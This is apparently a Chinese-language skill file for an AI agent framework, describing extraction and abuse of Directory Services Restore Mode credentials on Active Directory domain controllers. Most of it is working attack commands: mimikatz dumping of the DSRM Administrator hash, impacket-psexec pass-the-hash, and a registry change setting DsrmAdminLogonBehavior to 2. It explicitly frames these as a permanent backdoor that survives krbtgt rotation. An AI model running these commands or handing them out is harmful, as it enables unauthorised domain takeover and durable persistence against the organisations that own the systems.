---
name: 'dsrm-credentials'
description: 'DSRM凭据提取+利用：DC本地Administrator hash、DsrmAdminLogonBehavior=2远程PTH。耐轮换的持久化。'
disable-model-invocation: true
metadata: { domain: ad-win, tier: T2 }
---
> 📌 DSH 适配：本技能移植自 RS。原 read_skill/run_skill 调用 = 用 DSH 的 skill 工具按名加载对应技能；fleet/kali-mcp = 用 bash 后台任务与 subagent 工具实现。

## DSRM — Directory Services Restore Mode 凭据

### 原理
每个 DC 有一个 DSRM 本地 Administrator 账户（`.\Administrator`），其凭据独立于域。如果 `DsrmAdminLogonBehavior = 2`，可以用 DSRM 密码通过 PTH 登录 DC。

### 提取 DSRM 密码
```cmd
# 在 DC 上以 SYSTEM 运行
mimikatz.exe "token::elevate" "lsadump::sam" "exit"
# → 看 .\Administrator 的 NTLM hash
```

### 利用
```bash
# DSRM PTH（需要 DsrmAdminLogonBehavior = 2）
impacket-psexec -hashes :<DSRM_NTLM> Administrator@<DC_IP>

# 检查 DsrmAdminLogonBehavior
reg query HKLM\System\CurrentControlSet\Control\Lsa /v DsrmAdminLogonBehavior
# 0 = 只能在 DSRM 启动模式用
# 1 = 可以在正常模式用，但需本地控制台
# 2 = 可以在正常模式用，远程也行
```

### 修改 DsrmAdminLogonBehavior（已有 SYSTEM 时）
```powershell
New-ItemProperty -Path "HKLM:\System\CurrentControlSet\Control\Lsa" -Name "DsrmAdminLogonBehavior" -Value 2 -PropertyType DWORD -Force
```

### 场景
- 已有 SYSTEM on DC，想留一个永不失效的后门
- DSRM 密码不随域密码策略变化
- 域 krbtgt hash 轮换了 → Golden Ticket 失效 → DSRM 仍可用
